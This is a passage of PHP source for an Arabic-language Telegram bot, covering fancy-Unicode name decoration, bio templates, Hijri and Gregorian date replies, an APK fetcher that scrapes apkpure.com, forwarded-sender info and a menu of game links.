$ok = str_replace('k', 'K̑̈', $ok);
$ok = str_replace('l', 'L̑̈', $ok);
$ok = str_replace('m', 'M̑̈', $ok);
$ok = str_replace('n', 'N̑̈', $ok);
$ok = str_replace('o', 'Ȏ̈', $ok);
$ok = str_replace('p', 'P̑̈', $ok);
$ok = str_replace('q', 'Q̑̈', $ok);
$ok = str_replace('r', 'Ȓ̈', $ok);
$ok = str_replace('s', 'S̑̈', $ok);
$ok = str_replace('t', 'T̑̈', $ok);
$ok = str_replace('u', 'Ȗ̈', $ok);
$ok = str_replace('v', 'V̑̈', $ok);
$ok = str_replace('w', 'W̑̈', $ok);
$ok = str_replace('x', 'X̑̈', $ok);
$ok = str_replace('y', 'Y̑̈', $ok);
$ok = str_replace('z', 'Z̑̈‌‌', $ok);
$ok = str_replace('ض', 'ضِٰـۛৣـ', $ok);
$ok = str_replace('ص', 'صِٰـۛৣـ', $ok);
$ok = str_replace('ث', 'ثِٰـۛৣـ', $ok);
$ok = str_replace('ق', 'قِٰـۛৣـ', $ok);
$ok = str_replace('ف', 'فِٰ͒ـۛৣـ', $ok);
$ok = str_replace('غ', 'غِٰـۛৣـ', $ok);
$ok = str_replace('ع', 'عِٰـۛৣـ', $ok);
$ok = str_replace('خ', 'خِٰ̐ـۛৣـ', $ok);
$ok = str_replace('ح', 'حِٰـۛৣـ', $ok);
$ok = str_replace('ج', 'جِٰـۛৣـ', $ok);
$ok = str_replace('ش', 'شِٰـۛৣـ', $ok);
$ok = str_replace('س', 'سِٰـۛৣـ', $ok);
$ok = str_replace('ي', 'يِٰـۛৣـ', $ok);
$ok = str_replace('ب', 'بِٰـۛৣـ', $ok);
$ok = str_replace('ل', 'لِٰـۛৣـ', $ok);
$ok = str_replace('ا', 'آ', $ok);
$ok = str_replace('ت', 'تِٰـۛৣـ', $ok);
$ok = str_replace('ن', 'نِٰـۛৣـ', $ok);
$ok = str_replace('م', 'مِٰـۛৣـ', $ok);
$ok = str_replace('ك', 'ڪِٰـۛৣـ', $ok);
$ok = str_replace('ط', 'طِٰـۛৣـ', $ok);
$ok = str_replace('ظ', 'ظِٰـۛৣـ', $ok);
$ok = str_replace('ء', 'ء', $ok);
$ok = str_replace('ؤ', 'ؤ', $ok);
$ok = str_replace('ر', 'ر', $ok);
$ok = str_replace('ى', 'ى', $ok);
$ok = str_replace('ز', 'ز', $ok);
$ok = str_replace('و', 'ﯛ̲୭', $ok);
$ok = str_replace("ه", "໋۠هہؚ", $ok);
$p = $ok.''.$smile;
$items =  ['🇸🇾','﷼','ﷻ','﷽','✞','ッ','ッ','彡','Ω','۞','۩','✟','『','','』۝','Ξ','道','凸','父','个','¤','品','〠','๛','𖤍','ᶠᶸᶜᵏᵧₒᵤ','࿐','⍆','⍅','⇭','༒','','','𖠃','𖠅','𖠆','𖠊','𖡒','𖡗','𖣩','꧁','꧂','','〰','𖥓','𖥏','𖥎','𖥌','𖥋','𖥊','𖥈','𖥅','𖥃','𖥂','𖥀','𖤼','𖤹','𖤸','𖤷','𖤶','𖤭','𖤫','𖤪','𖤨','𖤧','𖤥','𖤤','𖤣','𖤢','𖤡','𖤟','𖤞','𖤝','𖤜','𖤛','𖤚','𖤘','𖤙','𖤗','𖤕','𖤓','𖤒','𖤐','ဏ','࿘','࿗','࿖','࿕','࿑','࿌','࿋','࿊','࿉','࿈','࿇','࿅','࿄','࿃','࿂','༼','༽','༺','༻','༗','༖','༕','⏝','⏜','⏎','၄','߷','ܛ','׀
𖠀','𖠁','𖠂','𖠅','𖠆','𖠇','𖠈','𖠉','𖠍','𖠎','𖠏','𖠐','𖠑','𖠒','𖠓','𖠔','𖠕','𖠖'];
$_smile = array_rand($items,1);
$smile = $items[$_smile];
$count = count($text);
$ok = str_replace('a','𝔸',$text);
$ok = str_replace("b","𝔹",$ok);
$ok = str_replace("c","ℂ",$ok);
$ok = str_replace("d","𝔻",$ok);
$ok = str_replace("e","𝔼",$ok);
$ok = str_replace("E","𝔽",$ok);
$ok = str_replace("g","𝔾",$ok);
$ok = str_replace("h","ℍ",$ok);
$ok = str_replace("i","𝕀",$ok);
$ok = str_replace("j","𝕁",$ok);
$ok = str_replace("k","𝕂",$ok);
$ok = str_replace("l","𝕃",$ok);
$ok = str_replace("m","𝕄",$ok);
$ok = str_replace("n","ℕ",$ok);
$ok = str_replace("o","𝕆",$ok);
$ok = str_replace("p","ℙ",$ok);
$ok = str_replace("q","ℚ",$ok);
$ok = str_replace("r","ℝ",$ok);
$ok = str_replace("s","𝕊",$ok);
$ok = str_replace("t","𝕋",$ok);
$ok = str_replace("u","𝕌",$ok);
$ok = str_replace("v","𝕍",$ok);
$ok = str_replace("w","𝕎",$ok);
$ok = str_replace("x","𝕏",$ok);
$ok = str_replace("y","Ý",$ok);
$ok = str_replace("z","ℤ",$ok);
$ok = str_replace('ض', 'ضّـ', $ok);
$ok = str_replace('ص', 'صْـ', $ok);
$ok = str_replace('ق', 'قّـ', $ok);
$ok = str_replace('ف', 'فّـ', $ok);
$ok = str_replace('غ', 'ﻏ̣̐', $ok);
$ok = str_replace('ع', 'ﻋ̝̚', $ok);
$ok = str_replace('ه', 'ﮪ', $ok);
$ok = str_replace('خ', 'خـّ', $ok);
$ok = str_replace('ح', 'حّـ', $ok);
$ok = str_replace('ج', 'جّـ', $ok);
$ok = str_replace('ش', 'ﺷ͠', $ok);
$ok = str_replace('س', 'ﺳ̶', $ok);
$ok = str_replace('ي', 'ې', $ok);
$ok = str_replace('ب', 'بّ', $ok);
$ok = str_replace('ل', 'ﻟ̣̣', $ok);
$ok = str_replace('ا', 'ﺂ̣̥̐', $ok);
$ok = str_replace('ت', 'تٌ', $ok);
$ok = str_replace('ن', 'نّ', $ok);
$ok = str_replace('م', 'ﻣ̝', $ok);
$ok = str_replace('ك', 'ﮗ', $ok);
$ok = str_replace('ظ', 'ظَّ', $ok);
$ok = str_replace('ط', 'طِّ', $ok);
$ok = str_replace('ذ', 'ذِ', $ok);
$ok = str_replace('د', 'دّ', $ok);
$ok = str_replace('ز', 'زّ', $ok);
$ok = str_replace('و', 'وٌ', $ok);
$ok = str_replace('ة', 'ة', $ok);
$ok = str_replace('ث', 'ثّـ', $ok);
$q = $ok.''.$smile;
bot('sendmessage',[
'chat_id'=>$f_ppp,
'text'=>"🍓 𝒘𝒆𝒍𝒍𝒄𝒐𝒎𝒆 ๛ $name 🌰",
'disable_web_page_preview'=>'true',
'parse_mode'=>'html',
'reply_markup'=>json_encode([ 
'inline_keyboard'=>[
[["text"=>"$a","callback_data"=>"m1"],["text"=>"$b","callback_data"=>"m2"]],
[["text"=>"$c","callback_data"=>"m3"],["text"=>"$d","callback_data"=>"m4"]],
[["text"=>"$e","callback_data"=>"m5"],["text"=>"$f","callback_data"=>"m6"]],
[["text"=>"$g","callback_data"=>"m7"],["text"=>"$h","callback_data"=>"m8"]],
[["text"=>"$i","callback_data"=>"m9"],["text"=>"$j","callback_data"=>"m10"]],
[["text"=>"$k","callback_data"=>"m11"],["text"=>"$l","callback_data"=>"m12"]],
[["text"=>"$m","callback_data"=>"m13"],["text"=>"$n","callback_data"=>"m14"]],
[["text"=>"$o","callback_data"=>"m15"],["text"=>"$p","callback_data"=>"m16"]],
[["text"=>"$q","callback_data"=>"m17"],["text"=>"$r","callback_data"=>"m18"]],
[['text'=>'Click to get it 🔝','callback_data'=>"000"]],
[['text'=>' 𝒃𝒊𝒐 🔜','callback_data'=>"M"],['text'=>'مرة اخرى 🔄','callback_data'=>"ii"]],
]
])
]);
file_put_contents("t.txt",$a);
file_put_contents("t1.txt",$b);
file_put_contents("t2.txt",$c);
file_put_contents("t3.txt",$d);
file_put_contents("t4.txt",$e);
file_put_contents("t5.txt",$f);
file_put_contents("t6.txt",$g);
file_put_contents("t7.txt",$h);
file_put_contents("t8.txt",$i);
file_put_contents("t9.txt",$j);
file_put_contents("t10.txt",$k);
file_put_contents("t11.txt",$l);
file_put_contents("t12.txt",$m);
file_put_contents("t13.txt",$n);
file_put_contents("t14.txt",$o);
file_put_contents("t15.txt",$p);
file_put_contents("t16.txt",$q);
file_put_contents("t17.txt",$r);
file_put_contents("t18.txt",$s);
file_put_contents("t19.txt",$t);
}
$arrmmoof = file_get_contents("t.txt");
if($data == "m1"){
bot('sendmessage',[
'chat_id'=>$f_ppp2,
'text'=>"*$arrmmoof*", 
'parse_mode'=>'Markdown',
]);
}
if($data == "m2"){
$arrmmoof1 = file_get_contents("t1.txt");
bot('sendmessage',[
'chat_id'=>$f_ppp2,
'text'=>"*
$arrmmoof1*", 
'parse_mode'=>'Markdown',
]);
}
if($data == "m3"){
$arrmmoof2 = file_get_contents("t2.txt");
bot('sendmessage',[
'chat_id'=>$f_ppp2,
'text'=>"*
$arrmmoof2*", 
]);
}
if($data == "m4"){
$arrmmoof3 = file_get_contents("t3.txt");
bot('sendmessage',[
'chat_id'=>$f_ppp2,
'text'=>"*
$arrmmoof3*", 
'parse_mode'=>'Markdown',
]);
}
if($data == "m5"){
$arrmmoof4 = file_get_contents("t4.txt");
bot('sendmessage',[
'chat_id'=>$f_ppp2,
'text'=>"*
$arrmmoof4*", 
'parse_mode'=>'Markdown',
]);
}
if($data == "m6"){
$arrmmoof5 = file_get_contents("t5.txt");
bot('sendmessage',[
'chat_id'=>$f_ppp2,
'text'=>"*
$arrmmoof5*", 
'parse_mode'=>'Markdown',
]);
}
if($data == "m7"){
$arrmmoof6 = file_get_contents("t6.txt");
bot('sendmessage',[
'chat_id'=>$f_ppp2,
'text'=>"*
$arrmmoof6*", 
'parse_mode'=>'Markdown',
]);
}
if($data == "m8"){
$arrmmoof7 = file_get_contents("t7.txt");
bot('sendmessage',[
'chat_id'=>$f_ppp2,
'text'=>"*
$arrmmoof7*", 
'parse_mode'=>'Markdown',
]);
}
if($data == "m9"){
$arrmmoof8 = file_get_contents("t8.txt");
bot('sendmessage',[
'chat_id'=>$f_ppp2,
'text'=>"*
$arrmmoof8*",
'parse_mode'=>'Markdown',
]);
}
if($data == "m10"){
$arrmmoof9 = file_get_contents("t9.txt");
bot('sendmessage',[
'chat_id'=>$f_ppp2,
'text'=>"*
$arrmmoof9*", 
'parse_mode'=>'Markdown',
]);
}
if($data == "m11"){
$arrmmoof10 = file_get_contents("t10.txt");
bot('sendmessage',[
'chat_id'=>$f_ppp2,
'text'=>"*
$arrmmoof10*", 
'parse_mode'=>'Markdown',
]);
}
if($data == "m12"){
$arrmmoof11 = file_get_contents("t11.txt");
bot('sendmessage',[
'chat_id'=>$f_ppp2,
'text'=>"*
$arrmmoof11*", 
'parse_mode'=>'Markdown',
]);
}
if($data == "m13"){
$arrmmoof12 = file_get_contents("t12.txt");
bot('sendmessage',[
'chat_id'=>$f_ppp2,
'text'=>"*
$arrmmoof12*", 
'parse_mode'=>'Markdown',
]);
}
if($data == "m14"){
$arrmmoof13 = file_get_contents("t13.txt");
bot('sendmessage',[
'chat_id'=>$f_ppp2,
'text'=>"*
$arrmmoof13*", 
'parse_mode'=>'Markdown',
]);
}
if($data == "m15"){
$arrmmoof14 = file_get_contents("t14.txt");
bot('sendmessage',[
'chat_id'=>$f_ppp2,
'text'=>"*
$arrmmoof14*", 
'parse_mode'=>'Markdown',
]);
}
if($data == "m16"){
$arrmmoof15 = file_get_contents("t15.txt");
bot('sendmessage',[
'chat_id'=>$f_ppp2,
'text'=>"*
$arrmmoof15*", 
'parse_mode'=>'Markdown',
]);
}


if($data == "m17"){
$arrmmoof16 = file_get_contents("t16.txt");
bot('sendmessage',[
'chat_id'=>$f_ppp2,
'text'=>"*
$arrmmoof16*", 
'parse_mode'=>'Markdown',
]);
}
if($data == "m18"){
$arrmmoof17 = file_get_contents("t17.txt");
bot('sendmessage',[
'chat_id'=>$f_ppp2,
'text'=>"*
$arrmmoof17*", 
'parse_mode'=>'Markdown',
]);
}
if($data == "m19"){
$arrmmoof18 = file_get_contents("t18.txt");
bot('sendmessage',[
'chat_id'=>$f_ppp2,
'text'=>"*
$arrmmoof18*", 
'parse_mode'=>'Markdown',
]);
}
if($data == "m20"){
$arrmmoof19 = file_get_contents("t19.txt");
bot('sendmessage',[
'chat_id'=>$f_ppp2,
'text'=>"*
$arrmmoof19*", 
'parse_mode'=>'Markdown',
]);
}
if($data == "m20"){
$arrmmoof20 = file_get_contents("t20.txt");
bot('sendmessage',[
'chat_id'=>$f_ppp2,
'text'=>"*
$arrmmoof20*", 
'parse_mode'=>'Markdown',
]);
}

$ArrrMoF = file_get_contents("ArrrMoF.txt");
if($data == "M" ){
file_put_contents("ArrrMoF.txt","ArrrMoF");
bot('EditMessageText',[
'chat_id'=>$f_ppp2,
'message_id'=>$php_aba_id2,
'text'=>"*
ارسل المعلومات بهذه الصيغه لطفا 
Mohammed
syria
16
student
php*",
'parse_mode'=>"MarkDown",
]);   
}
if($text != "/start" and $ArrrMoF == "ArrrMoF"){
file_put_contents("ArrrMoF.txt","none");
bot('sendmessage',[
'chat_id'=>$f_ppp,
'text'=>'*انتظر لطفا🦋💞*',
'parse_mode'=>"MarkDown",
]);
$a = ($text);
$b = explode("\n",$a);
$d = array(
"
-🖤𓂇| 𝙉𝙖𝙈𝙚 : $b[0]
-🖤𓂇| 𝙁𝙧𝙊𝙢 : $b[1]
-🖤𓂇| 𝘼𝙜𝙀 : $b[2]
-🖤𓂇| 𝙒𝙤𝙍𝙠 : $b[3]
-🖤𓂇|  𝙎𝙩𝘼𝙩𝙐𝙨 : $b[4]
","
𓋇: 𝙉𝙖𝙈𝙚 : $b[0]
𓋇: 𝙁𝙧𝙊𝙢 : $b[1]
𓋇: 𝘼𝙜𝙀 : $b[2]
𓋇: 𝙒𝙤𝙍𝙠 : $b[3]
𓋇: 𝙎𝙩𝘼𝙩𝙐𝙨 : $b[4]
","
⌔︙𝙉𝙖𝙈𝙚 : $b[0]
⌔︙𝙁𝙧𝙊𝙢 : $b[1]
⌔︙𝘼𝙜𝙀 : $b[2]
⌔︙𝙒𝙤𝙍𝙠 : $b[3]
⌔︙𝙎𝙩𝘼𝙩𝙐𝙨 : $b[4]
","
𝑁𝐴𝑀𝐸 : $b[0]
𝐶𝑂𝐔𝑁𝑇𝑅𝑌 : $b[1]
𝐴𝐺𝐸 : $b[2]
𝑊𝑂𝑅𝐾 : $b[3]
𝐻𝑂𝑃𝑌 : $b[4]
_____________࿖
","
𝓷𝓪𝓶𝓮 : $b[0]
𝓬𝓸𝓾𝓷𝓽𝓻𝔂 : $b[1]
𝓪𝓰𝓮 : $b[2]
𝔀𝓸𝓻𝓴 : $b[3]
𝓱𝓸𝓹𝔂 : $b[4]
_____________
","
ɴᴀᴍᴇ : $b[0]
ᴄᴏᴜɴᴛʀʏ : $b[1]
ᴀɢᴇ : $b[2]
ᴡᴏʀᴋ : $b[3]
ʜᴏᴘʏ : $b[4]
_____________🇸🇾
","
*𝙽𝙰𝙼𝙴 : $b[0]
𝙲𝙾𝚄𝙽𝚃𝚁𝚈 : $b[1]
𝙰𝙶𝙴 : $b[2]
𝚆𝙾𝚁𝙺 : $b[3]
𝙷𝙾𝙿𝚈 : $b[4]
_____________𖠖*
","
𝙉𝘼𝙈𝙀 : $b[0]
𝘾𝙊𝙐𝙉𝙏𝙍𝙔 : $b[1]
𝘼𝙂𝙀 : $b[2]
𝙒𝙊𝙍𝙆 : $b[3]
𝙃𝙊𝙋𝙔 : $b[4]
_____________ッ
","
ᴺᴬᴹᴱ : $b[0]
ᶜᴼᵁᴺᵀᴿᵞ : $b[1]
ᴬᴳᴱ : $b[2]
ᵂᴼᴿᴷ : $b[3]
ᴴᴼᴾᵞ : $b[4]
_____________𖤛
","
𝗻𝗮𝗺𝗲 : $b[0]
𝗰𝗼𝘂𝗻𝘁𝗿𝘆 : $b[1]
𝗮𝗴𝗲 : $b[2]
𝘄𝗼𝗿𝗸 : $b[3]
𝗵𝗼𝗽𝘆 : $b[4]
_____________𖤹
","
𝕹𝕬𝕸𝕰 : $b[0]
𝕮𝕺𝖀𝕹𝕿𝕽𝖄 : $b[1]
𝕬𝕲𝕰 : $b[2]
𝖂𝕺𝕽𝕶 : $b[3]
𝕳𝕺𝕻𝖄 : $b[4]
_____________𖠐
","
ＮＡＭＥ : $b[0]
ＣＯＵＮＴＲＹ : $b[1]
ＡＧＥ : $b[2]
ＷＯＲＫ : $b[3]
ＨＯＰＹ : $b[4]
_____________𖤢
","
ℕ𝔸𝕄𝔼 : $b[0]
ℂ𝕆𝕌ℕ𝕋ℝÝ : $b[1]
𝔸𝔾𝔼 : $b[2]
𝕎𝕆ℝ𝕂 : $b[3]
ℍ𝕆ℙÝ : $b[4]
_____________ ༖
",
);
$e = array_rand($d,1);
bot('sendMessage',[
'chat_id'=>$f_ppp,
'text'=>"*$d[$e]* ",
'parse_mode'=>"MarkDown",
'reply_markup'=>json_encode([ 
'inline_keyboard'=>[
[['text'=>'➤ بايو مجددا','callback_data'=>"M"]],
[['text'=>'➤ زخرفه مجددا','callback_data'=>"ii"]],
]])
]);
}
date_default_timezone_set('Asia/damascus');
  $date = date('h:i:s');  $Y = date ("Y");  
  $D = date("d");   $M = date("m");
 $Hij  =  mktime(0, 0, 0, Date("m"), Date("j"), Date("Y"));
  $d = round($Hij/(60*60*24));       $y = round($d/354.37419);# @edes0n  
  $Remain = $d-($y*354.37419);  $m = round($Remain/29.531182);   
  $d = $Remain-($m*29.531182);  
$y = $y+1389;  $m = $m+10;  $d = $d+24;
function month_name(){ $month_n = array( 
        1 => 'يناير', 2 => 'فبراير',  3 => ' مارس', 
       4 => 'ابريل ', 5 => 'مايو ',6 => 'يونيو',
       7 => 'يوليو', 8 => 'اغسطس', 9 => 'سبتمبر',
     10 => 'اكتوبر', 11 => 'نوفمبر', 12 => 'ديسمبر'
);return $month_n[date('n')]; 
  } $nM = month_name();
function mon_name(){ $month_a = array( 
       1 => 'جمادى الاول', 2 => 'جمادى الثاني',  3 => ' رجب', 
       4 => 'شعبان ', 5 => 'رمضان ',6 => 'شوال',
       7 => 'ذو القعده', 8 => 'ذو الحجه', 9 => 'محرم',
   10 => 'صفر ', 11 => 'ربيع الاول', 12 => 'ربيع الثاني '
);return $month_a[date('n')];
  } $nm = mon_name();
if ($d>29.531182 and round($d) != 30){ 
  $m = $m+1;   $d = Round($d-29.531182);  
}else{  $d = Round($d);  }
function day_name(){ $ds = array('الأحد', 'الأثنين', 'الثلاثاء', 'الأربعاء', 'الخميس', 'الجمعة', 'السبت');
 return $ds[date('w')];
}$DY = day_name();

$hj = $DY."/".$nm."/".$y."/".$m."/".$d."هـ\nـ".$date." ";
$Md = $DY."/".$nM."/".$Y."/".$M."/".$D."م\nـ".$date." ";

if($text == "هجري"){
bot('sendMessage',
[ 'chat_id'=>$chat_id,
'text'=>"$hj",
    ]);
 }
if($text == "ميلادي"){
bot('sendMessage',
[ 'chat_id'=>$chat_id,
'text'=>"$Md",
    ]);
 }
 $update = json_decode(file_get_contents('php://input'));
$message = $update->message;
$chat_id = $message->chat->id;
$from_id = $message->from->id;
$text = $message->text;
$chat_id2 = $update->callback_query->message->chat->id;
$message_id2 = $update->callback_query->message->message_id;
$data = $update->callback_query->data;
$message = $update->message;
$chat_id = $message->chat->id;
$text = $message->text;
$chat_id2 = $update->callback_query->message->chat->id;
$message_id = $update->callback_query->message->message_id;
$data = $update->callback_query->data;
$from_id = $message->from->id;
$name = $update->message->from->first_name;
$from_id = $message->from->id;
$ex = explode(' ',$text);
if ($text == "تحميل"){
  bot('sendMessage', [
'chat_id' => $chat_id,
'text' => "اهلا بك في قسم تحميل البرامج
كمثال للبحث 
telegram 
تليجراف", 
 ]);
  }
$exapp = str_replace('/app ','',$text);
if($text== "/app $exapp"){
$get = explode('<dl class="search-dl">', file_get_contents('https://apkpure.com/ar/search?q=' . urlencode($exapp)));
for($i = 1; $i<2; $i++){
$app = explode('"', $get[$i]);
$name = $app[1];
$url = $app[5];
$res['inline_keyboard'][] = [['text'=>$name,'callback_data'=>'dl#'.$url]];
bot('sendmessage',[
'chat_id'=>$chat_id,
'text' => 'اختر التطبيق ليتم تحميله :', 'reply_markup' => json_encode($res),
 ]);
 }}
$do = explode('#', $data);
if($do[0] == "dl"){
$hhzzz = explode('<a id="download_link"', file_get_contents('https://apkpure.com' . $do[1] . '/download?from=details'));
$hassan = explode('"', $hhzzz[1]);
$muaed = $hassan[9];
$vhhhhh = file_get_contents($muaed);
file_put_contents("wizard_system.apk",$vhhhhh);

bot('sendMessage', [
'chat_id'=>$chat_id2,
'message_id'=>$message_id2,
'text'=>"Downloading .....",
]);
bot('sendDocument',[
'chat_id'=>$chat_id2,
'document' => new CURLFile("wizard_system.apk"),
'caption'=>" Downloaded Done our channel ==> @Wizard_system ",
 ]);
 unlink(wizard_system.apk);
 }
 $id = $update->message->forward_from->id;
$user = $update->message->forward_from->username;
$name = $update->message->forward_from->first_name;
if($message->forward_from){
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"*
forward info 🔐🖤
💳الايدي : `$id`
📋المعرف :  `@$user`
💬الاسم  : `$name`
----------------------- *",
'parse_mode'=>"markdown",
'reply_to_message_id'=>$message->message_id,
]);
}
if($text=="الالعاب المتطورة"){
bot('sendmessage',[
 'chat_id'=>$chat_id,
 'message_id'=>$message_id,
'text'=>'
اختر لعبتك المفضلة :
',
'reply_markup'=>json_encode([ 
      'inline_keyboard'=>[
[['text'=>  "لعبة فلابي بيرد 🐥"  ,'url'=>'https://t.me/awesomebot?game=FlappyBird']],
[['text'=>"تحداني فالرياضيات 🔢",'url'=>'https://t.me/gamebot?game=MathBattle']],
[['text'=>"سباق الدراجات 🏍",'url'=>'https://t.me/gamee?game=MotoFX']],
[['text'=>"سباق سيارات 🏎",'url'=>'https://t.me/gamee?game=F1Racer']],
[['text'=>"متشابه 👾",'url'=>'https://t.me/gamee?game=DiamondRows']],
[['text'=>"كرة قدم ⚽️",'url'=>'https://t.me/gamee?game=FootballStar']],
[['text'=>"دومنا🥇",'url'=>'https://vipgames.com/play/?affiliateId=wpDom/#/games/domino/lobby']],
[['text'=>"❕ليدو",'url'=>'https://vipgames.com/play/?affiliateId=wpVG#/games/ludo/lobby']],
[['text'=>"ورق🤹‍♂️",'url'=>'https://t.me/gamee?game=Hexonix']],
[['text'=>"Hexonix❌",'url'=>'https://t.me/gamee?game=Hexonix']],
[['text'=>"MotoFx🏍",'url'=>'https://t.me/gamee?game=MotoFx']],
[['text'=>"لعبة 2048 🎰",'url'=>'https://t.me/awesomebot?game=g2048']],
[['text'=>"Squares🏁",'url'=>'https://t.me/gamee?game=Squares']],
[['text'=>"Atomic 1▶️",'url'=>'https://t.me/gamee?game=AtomicDrop1']],
[['text'=>"Corsairs",'url'=>'https://t.me/gamebot?game=Corsairs']],
[['text'=>"LumberJack",'url'=>'https://t.me/gamebot?game=LumberJack']],
[['text'=>"LittlePlane",'url'=>'https://t.me/gamee?game=LittlePlane']],
[['text'=>"RollerDisco",'url'=>'https://t.me/gamee?game=RollerDisco']],
[['text'=>'سورس ويزرد ™','url'=>'t.me/wizard_system']],
]])
]);
}